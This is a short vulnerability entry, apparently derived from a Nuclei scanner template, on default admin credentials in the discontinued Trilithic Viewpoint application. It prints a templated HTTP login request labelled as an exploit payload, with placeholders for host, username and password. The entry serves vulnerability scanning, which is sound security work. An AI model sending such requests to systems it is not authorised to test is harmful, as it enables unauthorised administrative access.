# Vulnerability: Trilithic Viewpoint Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`trilithic-viewpoint-login.yaml`)

## Description
Trilithic Viewpoint application default admin credentials were discovered. Note this product has been discontinued.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ViewPoint/admin/Site/ViewPointLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Cookie: trilithic_win_auth=false

{u:"{{username}}", t:"undefined", p:"{{password}}", d:"", r:false, w:false}
```

